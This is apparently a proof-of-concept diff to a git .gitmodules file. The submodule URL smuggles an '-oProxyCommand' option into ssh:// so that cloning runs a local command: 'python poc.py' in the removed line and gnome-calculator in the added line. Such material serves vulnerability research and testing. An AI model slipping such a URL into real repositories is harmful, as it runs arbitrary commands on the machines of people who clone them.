@@ -1,3 +1,3 @@
 [submodule "world"]
 	path = world
-	url = ssh://-T -oProxyCommand="python poc.py"/cert
+	url = ssh://-oProxyCommand=gnome-calculator/cert
